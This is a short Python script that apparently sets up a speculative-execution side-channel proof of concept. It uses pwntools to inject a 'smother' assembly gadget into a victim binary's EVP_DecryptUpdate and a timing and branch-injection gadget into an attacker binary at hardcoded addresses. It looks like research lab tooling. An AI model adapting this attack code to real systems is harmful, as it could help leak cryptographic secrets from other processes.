#!/usr/bin/env python

import os
import sys
from pwn import *

# Insert gadget at symbol
def inject_gadget(elf, gadget, symbol = '', addr = -1):
	if addr == -1:
		addr = elf.symbols[symbol]
	elf.asm(addr, gadget)

def get_addr(bin, symbol):
	file = ELF(bin)

	print file.symbols

def main(args):
	context.arch = 'amd64'
	nop = 'nop;\n'
	div_marker = 'mov r8d, -1; div r8d;\n'

	if(len(args) != 2):
		print ("Usage: %s <a/v>" % os.path.basename(args[0]))
		return 1

	if args[1] == 'v':
		elf = ELF('./victim_base')
		smother_gadget = """	ELSE:
							div r8d;
								add    rax,0x1;
								add    rdx,0x20;
								cmp    QWORD PTR [rbp-0x100],rax;
								je     END;
							mov	   r8d, -1;
							div    r8d;
								test   QWORD PTR [rdx],0x400;
								je     ELSE;
								mov    rdi,QWORD PTR [rbp-0xb0];
								mov    edx,DWORD PTR [rbp-0xf0];
								mov    rax,QWORD PTR [rdi+rax*8];
								test   edx,edx;
								mov    QWORD PTR [rbx+0x50],rax;
								END:
		 		 		 """
		inject_gadget(elf, smother_gadget, symbol = 'EVP_DecryptUpdate')
		elf.save('./victim')

	if args[1] == 'a':
		elf = ELF('./attack_base')

		delay_sequence = '' # '.rept 40; add ebc, eax;'
		timing_sequence = """ 	GADGET:
								rdtsc;
        						shl rdx, 0x20;
        						or rax, rdx;
        						mov r12, rax;
        						.rept 8;
        						btr r9d, r8d;
        						btr r11d, r10d;
        						bts r9d, r8d;
        						bts r11d, r10d
        						.endr;
        						rdtsc;
        						shl rdx, 0x20;
        						or rax, rdx;
        						sub rax, r12;
        						ret;
					      """
		n_nop = 17
		attack_gadget = n_nop * nop + div_marker + timing_sequence
		inject_gadget(elf, attack_gadget, symbol = 'EVP_DecryptUpdate')
		gadget_addr = elf.symbols['EVP_DecryptUpdate'] + n_nop

		set_attack_ptr = 'mov QWORD PTR [rax+0x20], ' + hex(gadget_addr) + '; nop;'
		# 0x45a8b is the address of the BTI gadget in the victim
		# 0x45a82 just before the BTI gadget on the attacker
		# We set the pointer at (rax + 0x20) to the address of the SMoTher gadget
		inject_gadget(elf, set_attack_ptr, addr = 0x45a82)

		# The attacker returns immediately after running the attack timing
		post_attack_stuff = """
								mov r12d, eax;
								jmp 0x45a11;
								ENDO:
							"""
		inject_gadget(elf, post_attack_stuff, addr = 0x45a8e)

		elf.save('./attack')

if __name__ == '__main__':
    exit(main(sys.argv))
